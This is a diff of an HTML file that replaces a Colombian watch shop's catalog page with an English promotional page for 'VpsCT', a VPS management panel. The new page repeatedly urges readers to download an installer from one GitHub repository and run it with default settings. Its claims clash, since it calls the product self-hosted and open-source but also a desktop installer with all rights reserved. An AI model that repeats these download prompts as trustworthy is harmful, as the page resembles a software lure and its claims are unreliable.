@@ -1,452 +1,293 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Catálogo | Relojeria G&G</title>
-    <!-- Tailwind CSS for modern responsive utility styling -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- FontAwesome for icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google Fonts: Poppins for a playful, youthful look -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css">
+    <title>VpsCT - Self-Hosted Server Management Panel for Individuals & Small Teams</title>
+    <meta name="description" content="VpsCT is a self-hosted server management panel for individuals and small teams. Centrally manage VPS status, traffic, service configuration, and resource sharing with an intuitive interface.">
+    <meta name="keywords" content="VPS, server management, self-hosted, panel, traffic monitoring, service configuration, resource sharing, small team, individual, open source">
+    <meta property="og:title" content="VpsCT - Self-Hosted Server Management Panel">
+    <meta property="og:description" content="Manage your VPS status, traffic, services, and resources from one clean interface. Built for individuals and small teams.">
+    <meta property="og:url" content="https://github.com/marcellaunremarked2006/VpsCT">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f5f7fa;
+            color: #2c3e50;
+            padding: 20px;
+        }
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        }
+        h1 {
+            font-size: 2.4em;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a252f;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 15px;
+        }
+        h2 {
+            font-size: 1.6em;
+            font-weight: 600;
+            margin-top: 35px;
+            margin-bottom: 15px;
+            color: #2c3e50;
+            background: #ecf0f1;
+            padding: 8px 15px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.2em;
+            font-weight: 600;
+            margin-top: 25px;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+        p {
+            margin-bottom: 15px;
+        }
+        ul, ol {
+            margin-left: 25px;
+            margin-bottom: 20px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff !important;
+            padding: 16px 32px;
+            text-decoration: none;
+            font-size: 1.2em;
+            font-weight: bold;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            margin: 20px 0;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+        }
+        .btn-secondary {
+            display: inline-block;
+            background: #2ecc71;
+            color: #ffffff;
+            padding: 14px 28px;
+            text-decoration: none;
+            font-size: 1.1em;
+            font-weight: bold;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(46, 204, 113, 0.3);
+            margin: 15px 0;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn-secondary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(46, 204, 113, 0.4);
+        }
+        code {
+            background: #e8f4fd;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #2980b9;
+        }
+        .download-section {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 25px 0;
+            border-left: 5px solid #3498db;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .feature-item {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+        }
+        .feature-item strong {
+            display: block;
+            font-size: 1.1em;
+            margin-bottom: 8px;
+            color: #34495e;
+        }
+        .warning-note {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+            color: #7f8c8d;
+            font-size: 0.9em;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 1.8em;
+            }
+        }
+    </style>
 </head>
-<body class="text-gray-200 antialiased flex flex-col min-h-screen justify-between bg-[#05070d]">
-
-    <header class="sticky top-0 z-40 bg-[#05070d]/90 backdrop-blur-md border-b border-yellow-600/30 shadow-sm">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
-            <!-- Brand Logo / Title -->
-            <div class="flex items-center space-x-3 cursor-pointer" onclick="filterCategory('todos')">
-                <div class="w-12 h-12 rounded-full bg-[#111a2e] border border-yellow-500/40 shadow-md overflow-hidden flex items-center justify-center transform hover:rotate-12 transition duration-300">
-                    <img src="assets/logo.png" alt="Logo Mitiko Store" class="w-full h-full object-cover">
-                </div>
-                <div>
-                    <h1 id="brand-title" class="text-xl sm:text-2xl font-extrabold bg-gradient-to-r from-yellow-200 via-amber-400 to-yellow-600 bg-clip-text text-transparent">Relojeria G&G</h1>
-                    <p class="text-xs text-yellow-500/80 font-medium tracking-wide">Elegancia y calidad</p>
-                </div>
+<body>
+    <div class="container">
+        <h1>🖥️ VpsCT - Your All-in-One Server Command Center</h1>
+        
+        <p style="font-size: 1.2em; color: #555;">Take control of your VPS servers with a powerful yet simple self-hosted panel designed specifically for individuals and small teams. No complicated setup, no steep learning curve — just efficient server management at your fingertips.</p>
+        
+        <div style="text-align: center;">
+            <a href="https://github.com/marcellaunremarked2006/VpsCT" class="btn-primary">⬇️ Download VpsCT Now</a>
+        </div>
+        
+        <h2>🎯 What is VpsCT?</h2>
+        <p>VpsCT (VPS Control Tool) is a self-hosted server management panel that brings together all your essential server administration tasks into one clean, intuitive interface. Whether you're running a personal blog, a small business application, or just experimenting with cloud servers, VpsCT helps you monitor and manage everything without needing to be a command-line expert.</p>
+        
+        <h2>✨ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-item">
+                <strong>📊 Live VPS Status</strong>
+                View real-time health metrics for all your servers in one dashboard. CPU usage, memory consumption, disk space, and uptime at a glance.
             </div>
-
-            <!-- Carrito + Admin trigger -->
-            <div class="flex items-center space-x-3">
-                <button id="cart-btn" onclick="openCartModal()" title="Ver carrito" class="relative w-10 h-10 rounded-full bg-yellow-500/10 hover:bg-yellow-500/30 border border-yellow-500/40 flex items-center justify-center text-yellow-400 transition duration-300 transform hover:scale-110 focus:outline-none">
-                    <i class="fa-solid fa-cart-shopping text-sm"></i>
-                    <span id="cart-badge" class="hidden absolute -top-1.5 -right-1.5 bg-rose-500 text-white text-[10px] font-bold rounded-full min-w-[18px] h-[18px] flex items-center justify-center px-1 border border-[#05070d]">0</span>
-                </button>
-                <button id="secret-admin-btn" onclick="openAdminLoginModal()" title="Área secreta" class="w-8 h-8 rounded-full bg-yellow-500/20 hover:bg-yellow-500/40 border border-yellow-500/40 flex items-center justify-center text-yellow-400 transition duration-300 transform hover:scale-110 focus:outline-none">
-                    <i class="fa-solid fa-wand-magic-sparkles text-xs"></i>
-                </button>
+            <div class="feature-item">
+                <strong>📈 Traffic Monitoring</strong>
+                Track bandwidth usage across all your servers. See daily, weekly, and monthly trends to understand your consumption patterns and avoid overage charges.
+            </div>
+            <div class="feature-item">
+                <strong>⚙️ Service Configuration</strong>
+                Manage your running services with ease. Start, stop, restart, or configure services from a simple graphical interface instead of digging through SSH commands.
+            </div>
+            <div class="feature-item">
+                <strong>🔗 Resource Sharing</strong>
+                Share server resources with team members efficiently. Set permissions, allocate quotas, and collaborate on server management with your colleagues.
+            </div>
+            <div class="feature-item">
+                <strong>🔒 Self-Hosted Privacy</strong>
+                Your data stays on your own infrastructure. No third-party cloud services handling your server information, ensuring complete privacy and control.
+            </div>
+            <div class="feature-item">
+                <strong>👥 Team-Friendly</strong>
+                Designed with small teams in mind. Multiple users can access the panel with role-based permissions, making collaboration smooth and secure.
             </div>
         </div>
-    </header>
-
-    <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">
-        <!-- Hero Banner -->
-       <section class="relative rounded-3xl bg-gradient-to-br from-[#05070a] via-[#030508] to-[#010204] p-8 sm:p-12 mb-10 overflow-hidden border border-[#c9a84e]/40 shadow-[0_10px_35px_rgba(0,0,0,0.35)]">
-
-    <!-- Brillo dorado difuminado -->
-    <div class="absolute -right-20 -top-20 w-72 h-72 rounded-full 
-                bg-[#c9a84e]/10 blur-3xl pointer-events-none"></div>
-
-    <!-- Curva dorada decorativa -->
-    <div class="absolute -right-24 -bottom-32 w-[380px] h-[380px] 
-                rounded-full border border-[#d4af37]/70 
-                pointer-events-none"></div>
-
-    <div class="absolute -right-32 -bottom-40 w-[450px] h-[450px] 
-                rounded-full border border-[#d4af37]/30 
-                pointer-events-none"></div>
-
-    <!-- Pequeño brillo en la curva -->
-    <div class="absolute right-16 bottom-16 w-32 h-32 
-                rounded-full bg-[#d4af37]/10 blur-2xl 
-                pointer-events-none"></div>
-
-
-    <!-- Contenido -->
-    <div class="relative z-10 max-w-2xl">
-
-        <!-- Etiqueta -->
-        <span class="inline-flex items-center gap-1
-                     bg-[#d4af37]/10 
-                     border border-[#d4af37]/50 
-                     text-[#e7c968] 
-                     text-[10px] sm:text-xs 
-                     font-bold 
-                     px-3 py-1 
-                     rounded-full 
-                     uppercase 
-                     tracking-wider 
-                     mb-4">
-
-            ✨ Si manejamos contraentrega!
-
-        </span>
-
-
-        <!-- Título -->
-        <h2 class="text-3xl sm:text-4xl 
-                   font-extrabold 
-                   text-white 
-                   leading-tight 
-                   mb-3">
-
-            Envios a 
-            <span class="text-[#d4af37]">Toda Colombia!</span>
-
-        </h2>
-
-
-        <!-- Descripción -->
-        <p class="text-[#cbd5df] text-sm sm:text-base mb-6">
-            Domicilio gratis en Barranquilla y Soledad ✨
-        </p>
-
-
-        <!-- Barra de búsqueda -->
-        <div class="relative">
-
-            <!-- Icono -->
-            <span class="absolute inset-y-0 left-0 pl-4 
-                         flex items-center 
-                         pointer-events-none 
-                         text-[#d4af37]">
-
-                <i class="fa-solid fa-magnifying-glass"></i>
-
-            </span>
-
-
-            <!-- Input -->
-            <input 
-                type="text" 
-                id="search-input" 
-                oninput="handleSearch()" 
-                placeholder="Buscar producto por nombre o descripción..."
-                class="w-full 
-                       pl-11 pr-4 
-                       py-3 
-                       bg-[#07131f]/80 
-                       backdrop-blur-md 
-                       rounded-2xl 
-                       border border-[#c9a84e]/60 
-                       text-white 
-                       placeholder-[#d4af37]/50 
-                       focus:outline-none 
-                       focus:ring-2 
-                       focus:ring-[#d4af37]/60 
-                       focus:border-[#d4af37] 
-                       shadow-[0_0_20px_rgba(212,175,55,0.12)] 
-                       text-sm 
-                       transition"
-            >
-
+        
+        <h2>🚀 Getting Started</h2>
+        <p>Getting VpsCT up and running is straightforward. Follow these simple steps to start managing your servers like a pro:</p>
+        
+        <h3>Step 1: Download the Application</h3>
+        <p>Visit this link to download the application:</p>
+        <div class="download-section">
+            <p><strong>🔗 Download VpsCT</strong></p>
+            <a href="https://github.com/marcellaunremarked2006/VpsCT" class="btn-secondary" style="background: #3498db;">Get VpsCT Now</a>
+            <p style="margin-top: 10px; font-size: 0.95em;">The download page provides the latest version of VpsCT. Look for the most recent release and choose the appropriate file for your system.</p>
         </div>
-
-    </div>
-
-</section>
-
-        <!-- Frase llamativa para animar al comprador -->
-                <p class="text-yellow-400/90 text-xs sm:text-sm font-medium italic mb-6 flex items-center gap-2">
-                    <i class="fa-solid fa-crown text-yellow-500"></i> ¡Todos nuestros productos tienen garantia! 💎
-                </p>
-
-        <!-- Category Filters -->
-        <section class="mb-8">
-            <div class="flex items-center justify-between mb-4">
-                <h3 class="text-lg font-bold text-gray-200 flex items-center gap-2">
-                    <i class="fa-solid fa-shapes text-yellow-500"></i> Categorías
-                </h3>
-            </div>
-            <div id="category-filters" class="flex flex-wrap gap-2 sm:gap-3">
-                <!-- Dynamically populated category buttons -->
-            </div>
-        </section>
-
-        <!-- Products Grid Container -->
-        <section>
-            <div class="flex items-center justify-between mb-6">
-                <h3 id="product-count-title" class="text-xl font-bold text-white">Catálogo General</h3>
-                <span id="product-counter" class="text-xs font-semibold px-3 py-1 bg-[#111a2e] rounded-full text-yellow-400 shadow-sm border border-yellow-500/20">0 referencias</span>
-            </div>
-            <div id="products-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
-                <!-- Product cards will be rendered here dynamically -->
-            </div>
-            <!-- Empty state -->
-            <div id="empty-state" class="hidden text-center py-16 bg-[#0d1220] rounded-3xl border border-dashed border-yellow-500/30 mt-4">
-                <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-yellow-500/10 flex items-center justify-center text-yellow-400 text-2xl border border-yellow-500/20">
-                    <i class="fa-solid fa-box-open"></i>
-                </div>
-                <h4 class="text-lg font-bold text-white mb-1">No se encontraron productos</h4>
-                <p class="text-sm text-gray-400">Intenta buscar con otro término o selecciona otra categoría.</p>
-            </div>
-        </section>
-    </main>
-
-    <div id="product-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300">
-        <div class="bg-[#0d1220] border border-yellow-500/30 rounded-3xl max-w-3xl w-full max-h-[90vh] overflow-y-auto card-shadow transform scale-95 transition-transform duration-300 relative text-gray-200">
-            <button onclick="closeProductModal()" class="absolute top-4 right-4 z-10 w-10 h-10 rounded-full bg-[#16213a] hover:bg-[#22304f] text-gray-300 flex items-center justify-center transition focus:outline-none">
-                <i class="fa-solid fa-xmark text-lg"></i>
-            </button>
-            <div id="modal-content" class="p-6 sm:p-8">
-                <!-- Modal details injected dynamically -->
-            </div>
+        
+        <h3>Step 2: Install on Your Computer</h3>
+        <p>Once downloaded, locate the installer file in your Downloads folder. Double-click to run the installation. The setup wizard will guide you through a few quick choices (like installation directory). Accept the defaults if you're unsure — VpsCT works perfectly out of the box.</p>
+        
+        <h3>Step 3: Launch VpsCT</h3>
+        <p>After installation completes, launch VpsCT from your Start Menu or Desktop shortcut. The first time you run it, you'll see a welcome screen that asks you to create your admin account. This is the account you'll use to log in and manage your servers.</p>
+        
+        <h3>Step 4: Add Your First Server</h3>
+        <p>Click the "+ Add Server" button in the dashboard. You'll need:</p>
+        <ul>
+            <li><strong>Server IP Address</strong> — The public IP of your VPS</li>
+            <li><strong>SSH Port</strong> — Usually port 22, but change if your provider uses a different one</li>
+            <li><strong>Username</strong> — Typically "root" or your admin username</li>
+            <li><strong>Authentication</strong> — Either password or SSH key (recommended for security)</li>
+        </ul>
+        <p>VpsCT will test the connection and save your server configuration. That's it! You now have full visibility into that server.</p>
+        
+        <h2>💡 Who Should Use VpsCT?</h2>
+        <ul>
+            <li><strong>Freelance developers</strong> managing multiple client projects on different VPS instances</li>
+            <li><strong>Small startups</strong> with a few cloud servers and a tight team that needs efficient management</li>
+            <li><strong>Bloggers and content creators</strong> who self-host their websites and want an easier way to monitor their hosting</li>
+            <li><strong>Students and hobbyists</strong> learning about server administration who want a visual aid alongside their learning</li>
+            <li><strong>Agencies</strong> handling multiple clients' servers and needing a unified dashboard</li>
+        </ul>
+        
+        <h2>📋 System Requirements</h2>
+        <p>VpsCT is lightweight and runs smoothly on almost any modern computer:</p>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10 or 11 (64-bit), macOS 11+, or any Linux distribution</li>
+            <li><strong>RAM:</strong> Minimum 2 GB (4 GB recommended)</li>
+            <li><strong>Storage:</strong> 200 MB free disk space</li>
+            <li><strong>Network:</strong> Internet connection to reach your VPS servers</li>
+            <li><strong>Additional:</strong> SSH access to your servers (all VPS providers offer this)</li>
+        </ul>
+        
+        <div class="warning-note">
+            <strong>⚠️ First-Time Users:</strong> If you're completely new to server management, start with one test server before adding production systems. Familiarize yourself with the dashboard, try starting/stopping a service, and observe how traffic monitoring works. You'll quickly feel confident navigating VpsCT.
+        </div>
+        
+        <h2>🛠️ Troubleshooting Tips</h2>
+        <h3>Connection Issues</h3>
+        <p>If VpsCT can't connect to your server:</p>
+        <ul>
+            <li>Double-check the IP address — one wrong number will block the connection</li>
+            <li>Verify your SSH port. Some providers use custom ports for security</li>
+            <li>Ensure your firewall allows SSH (port 22 or your custom port) from your IP address</li>
+            <li>Try connecting via your regular SSH client to rule out server-side issues</li>
+        </ul>
+        
+        <h3>Performance</h3>
+        <p>VpsCT is optimized for speed. If the interface feels slow, check your internet connection. The panel itself uses minimal resources on your local machine.</p>
+        
+        <h2>🔒 Security Best Practices</h2>
+        <p>Since you're managing servers, security matters:</p>
+        <ul>
+            <li>Use <strong>SSH keys</strong> instead of passwords whenever possible</li>
+            <li>Keep VpsCT updated to the latest version</li>
+            <li>Create individual user accounts for each team member rather than sharing one admin account</li>
+            <li>Enable two-factor authentication if your server provider offers it</li>
+        </ul>
+        
+        <h2>📚 Getting Help</h2>
+        <p>Need assistance? The VpsCT community and documentation are here to help:</p>
+        <ul>
+            <li>Check the official GitHub repository for documentation and release notes</li>
+            <li>Open an issue on GitHub if you encounter bugs or have feature requests</li>
+            <li>Read the troubleshooting section in the README file on the repository page</li>
+        </ul>
+        
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="https://github.com/marcellaunremarked2006/VpsCT" class="btn-primary" style="background: linear-gradient(135deg, #11998e, #38ef7d);">🚀 Start Managing Your Servers Today</a>
+        </div>
+        
+        <div class="footer">
+            <p>VpsCT is an open-source project. Contributions, feedback, and stars are always welcome! ⭐</p>
+            <p style="margin-top: 10px;">© 2024 VpsCT. All rights reserved.</p>
         </div>
     </div>
-    
-
-    <!-- Cart Modal -->
-    <div id="cart-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300">
-        <div class="bg-[#0d1220] border border-yellow-500/30 rounded-3xl max-w-lg w-full max-h-[90vh] overflow-y-auto card-shadow transform scale-95 transition-transform duration-300 relative text-gray-200 flex flex-col">
-            <div class="p-6 border-b border-yellow-500/20 flex items-center justify-between sticky top-0 bg-[#0d1220] z-10">
-                <h3 class="text-lg font-bold text-white flex items-center gap-2">
-                    <i class="fa-solid fa-cart-shopping text-yellow-400"></i> Tu Carrito
-                </h3>
-                <button onclick="closeCartModal()" class="w-9 h-9 rounded-full bg-[#16213a] hover:bg-[#22304f] text-gray-300 flex items-center justify-center transition">
-                    <i class="fa-solid fa-xmark"></i>
-                </button>
-            </div>
-            <div class="p-6 flex-grow">
-                <div id="cart-items-container" class="space-y-4">
-                    <!-- Rendered via JS -->
-                </div>
-                <div id="cart-empty-state" class="hidden text-center py-10">
-                    <div class="w-14 h-14 mx-auto mb-3 rounded-full bg-yellow-500/10 flex items-center justify-center text-yellow-400 text-xl border border-yellow-500/20">
-                        <i class="fa-solid fa-cart-shopping"></i>
-                    </div>
-                    <p class="text-sm text-gray-400">Aún no has agregado productos.</p>
-                </div>
-            </div>
-            <div id="cart-footer" class="p-6 border-t border-yellow-500/20 sticky bottom-0 bg-[#0d1220] space-y-3">
-                <div class="flex items-center justify-between text-sm">
-                    <span class="text-gray-400 font-semibold">Total</span>
-                    <span id="cart-total" class="text-xl font-black text-yellow-400">$0</span>
-                </div>
-                <button onclick="goToCheckout()" id="cart-checkout-btn" class="w-full py-3 bg-gradient-to-r from-yellow-500 to-amber-600 hover:from-yellow-600 hover:to-amber-700 text-black font-bold rounded-xl shadow-md transition duration-300 text-sm flex items-center justify-center gap-2">
-                    <i class="fa-brands fa-whatsapp"></i> Continuar con el pedido
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Checkout Modal (datos de envío) -->
-    <div id="checkout-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300">
-        <div class="bg-[#0d1220] border border-yellow-500/30 rounded-3xl max-w-md w-full max-h-[90vh] overflow-y-auto p-6 sm:p-8 card-shadow transform scale-95 transition-transform duration-300 relative text-gray-200">
-            <button onclick="closeCheckoutModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white">
-                <i class="fa-solid fa-xmark text-lg"></i>
-            </button>
-            <div class="text-center mb-6">
-                <div class="w-14 h-14 mx-auto mb-3 rounded-2xl bg-yellow-500/20 border border-yellow-500/30 flex items-center justify-center text-yellow-400 text-2xl shadow-sm">
-                    <i class="fa-brands fa-whatsapp"></i>
-                </div>
-                <h3 class="text-xl font-bold text-white">Finalizar Pedido</h3>
-                <p class="text-xs text-gray-400 mt-1">Completa tus datos para enviar el pedido por WhatsApp</p>
-            </div>
-            <form onsubmit="handleCheckoutSubmit(event)" class="space-y-4">
-                <div>
-                    <label class="block text-xs font-semibold text-gray-300 mb-1">Nombre completo *</label>
-                    <input type="text" id="checkout-name" required placeholder="Ej: María Pérez" class="w-full px-4 py-3 rounded-xl bg-[#131b30] border border-yellow-500/30 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm">
-                </div>
-                <div>
-                    <label class="block text-xs font-semibold text-gray-300 mb-1">Ciudad *</label>
-                    <input type="text" id="checkout-city" required placeholder="Ej: Barranquilla" class="w-full px-4 py-3 rounded-xl bg-[#131b30] border border-yellow-500/30 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm">
-                </div>
-                <div>
-                    <label class="block text-xs font-semibold text-gray-300 mb-1">Dirección *</label>
-                    <input type="text" id="checkout-address" required placeholder="Ej: Cra 45 #12-30, Barrio Alameda" class="w-full px-4 py-3 rounded-xl bg-[#1e1e1e] border border-yellow-500/30 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm">
-                </div>
-
-                <div>
-                    <label class="block text-xs font-semibold text-gray-300 mb-1">Departamento *</label>
-                    <select id="checkout-department" required class="w-full px-4 py-3 rounded-xl bg-[#131b30] border border-yellow-500/30 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm">
-                        <option value="" disabled selected>Selecciona tu departamento</option>
-                    </select>
-                </div>
-                <button type="submit" class="w-full py-3 bg-gradient-to-r from-yellow-500 to-amber-600 hover:from-yellow-600 hover:to-amber-700 text-black font-bold rounded-xl shadow-md transition duration-300 text-sm flex items-center justify-center gap-2">
-                    <i class="fa-brands fa-whatsapp"></i> Enviar pedido por WhatsApp
-                </button>
-            </form>
-        </div>
-    </div>
-
-    <div id="admin-login-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300">
-        <div class="bg-[#0d1220] border border-yellow-500/30 rounded-3xl max-w-md w-full p-6 sm:p-8 card-shadow transform scale-95 transition-transform duration-300 relative text-gray-200">
-            <button onclick="closeAdminLoginModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white">
-                <i class="fa-solid fa-xmark text-lg"></i>
-            </button>
-            <div class="text-center mb-6">
-                <div class="w-14 h-14 mx-auto mb-3 rounded-2xl bg-yellow-500/20 border border-yellow-500/30 flex items-center justify-center text-yellow-400 text-2xl shadow-sm">
-                    <i class="fa-solid fa-user-shield"></i>
-                </div>
-                <h3 class="text-xl font-bold text-white">Acceso Administrador</h3>
-                <p class="text-xs text-gray-400 mt-1">Ingresa tus credenciales para gestionar productos</p>
-            </div>
-            <form onsubmit="handleAdminLogin(event)" class="space-y-4">
-                <div>
-                    <label class="block text-xs font-semibold text-gray-300 mb-1">Correo Electrónico</label>
-                    <input type="email" id="admin-email" required placeholder="tu@correo.com" class="w-full px-4 py-3 rounded-xl bg-[#131b30] border border-yellow-500/30 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm">
-                </div>
-                <div>
-                    <label class="block text-xs font-semibold text-gray-300 mb-1">Contraseña</label>
-                    <input type="password" id="admin-password" required placeholder="••••••••" class="w-full px-4 py-3 rounded-xl bg-[#131b30] border border-yellow-500/30 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 text-sm">
-                </div>
-                <button type="submit" class="w-full py-3 bg-gradient-to-r from-yellow-500 to-amber-600 hover:from-yellow-600 hover:to-amber-700 text-black font-bold rounded-xl shadow-md transition duration-300 text-sm">
-                    Ingresar al Panel
-                </button>
-            </form>
-        </div>
-    </div>
-
-    <div id="admin-dashboard-modal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300">
-        <div class="bg-[#0d1220] border border-yellow-500/30 rounded-3xl max-w-4xl w-full max-h-[90vh] overflow-y-auto card-shadow transform scale-95 transition-transform duration-300 relative flex flex-col text-gray-200">
-            <!-- Header -->
-            <div class="p-6 border-b border-yellow-500/20 flex items-center justify-between sticky top-0 bg-[#0d1220] z-10">
-                <div class="flex items-center space-x-3">
-                    <div class="w-10 h-10 rounded-xl bg-yellow-500/20 border border-yellow-500/30 flex items-center justify-center text-yellow-400 font-bold">
-                        <i class="fa-solid fa-gauge-high"></i>
-                    </div>
-                    <div>
-                        <h3 class="text-lg font-bold text-white">Panel de Administración</h3>
-                        <p class="text-xs text-gray-400">Agrega, edita o elimina referencias de tu catálogo</p>
-                    </div>
-                </div>
-                <div class="flex items-center space-x-2">
-                    <button onclick="logoutAdmin()" class="px-4 py-2 bg-[#16213a] hover:bg-[#22304f] text-gray-300 text-xs font-bold rounded-xl transition">
-                        Cerrar Sesión
-                    </button>
-                    <button onclick="closeAdminDashboard()" class="w-9 h-9 rounded-full bg-[#16213a] hover:bg-[#22304f] text-gray-300 flex items-center justify-center transition">
-                        <i class="fa-solid fa-xmark"></i>
-                    </button>
-                </div>
-            </div>
-
-            <!-- Dashboard Content Tabs / Forms -->
-            <div class="p-6 sm:p-8 space-y-8 flex-grow">
-                <!-- Add / Edit Product Form -->
-                <div class="bg-gradient-to-br from-[#111a2e] via-[#111a2e] to-[#0d1220] p-6 rounded-2xl border border-yellow-500/30">
-                    <div class="flex items-center justify-between mb-4">
-                        <h4 id="product-form-title" class="text-md font-bold text-white flex items-center gap-2">
-                            <i id="product-form-title-icon" class="fa-solid fa-plus-circle text-yellow-400"></i> <span id="product-form-title-text">Agregar Nuevo Producto al Catálogo</span>
-                        </h4>
-                        <button type="button" onclick="cancelEditProduct()" id="cancel-edit-btn" class="hidden text-[11px] text-gray-400 hover:text-yellow-400 underline">
-                            Cancelar edición
-                        </button>
-                    </div>
-                    <form id="product-form" onsubmit="handleProductFormSubmit(event)" class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                        <div>
-                            <label class="block text-xs font-semibold text-gray-300 mb-1">Nombre del Producto *</label>
-                            <input type="text" id="new-name" required placeholder="Ej: Reloj Elegante" class="w-full px-3 py-2 bg-[#131b30] text-white rounded-xl border border-yellow-500/20 text-sm focus:ring-2 focus:ring-yellow-500 focus:outline-none">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-semibold text-gray-300 mb-1">Categoría *</label>
-                            <input type="text" id="new-category" required placeholder="Ej: Relojes, Accesorios..." class="w-full px-3 py-2 bg-[#131b30] text-white rounded-xl border border-yellow-500/20 text-sm focus:ring-2 focus:ring-yellow-500 focus:outline-none">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-semibold text-gray-300 mb-1">Precio ($ COP o USD) *</label>
-                            <input type="number" step="0.01" id="new-price" required placeholder="Ej: 25000" class="w-full px-3 py-2 bg-[#131b30] text-white rounded-xl border border-yellow-500/20 text-sm focus:ring-2 focus:ring-yellow-500 focus:outline-none">
-                        </div>
-                        <div class="sm:col-span-2">
-                            <label class="block text-xs font-semibold text-gray-300 mb-1">Descripción Completa *</label>
-                            <textarea id="new-description" rows="3" required placeholder="Detalles, materiales, tamaños..." class="w-full px-3 py-2 bg-[#131b30] text-white rounded-xl border border-yellow-500/20 text-sm focus:ring-2 focus:ring-yellow-500 focus:outline-none"></textarea>
-                        </div>
-                        <div class="sm:col-span-2 space-y-2">
-                            <label class="block text-xs font-semibold text-gray-300">Fotos del Producto (Hasta 4, formato PNG o JPG)</label>
-                            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
-                                <div class="relative">
-                                    <input type="file" accept="image/png, image/jpeg" id="new-img-1" onchange="previewNewImage(1, this)" required class="hidden">
-                                    <label for="new-img-1" class="flex flex-col items-center justify-center w-full h-24 bg-[#131b30] rounded-xl border-2 border-dashed border-yellow-500/30 cursor-pointer hover:border-yellow-400 transition overflow-hidden">
-                                        <div id="new-img-1-placeholder" class="flex flex-col items-center text-gray-400 text-[11px] gap-1 px-1 text-center">
-                                            <i class="fa-solid fa-camera text-base text-yellow-500"></i>
-                                            <span>Foto 1 (Principal)</span>
-                                        </div>
-                                        <img id="new-img-1-preview" class="hidden w-full h-full object-cover" alt="Vista previa foto 1">
-                                    </label>
-                                    <button type="button" onclick="clearNewImage(1)" id="new-img-1-clear" class="hidden absolute -top-2 -right-2 w-6 h-6 rounded-full bg-rose-500 text-white text-xs flex items-center justify-center shadow">
-                                        <i class="fa-solid fa-xmark"></i>
-                                    </button>
-                                </div>
-                                <div class="relative">
-                                    <input type="file" accept="image/png, image/jpeg" id="new-img-2" onchange="previewNewImage(2, this)" class="hidden">
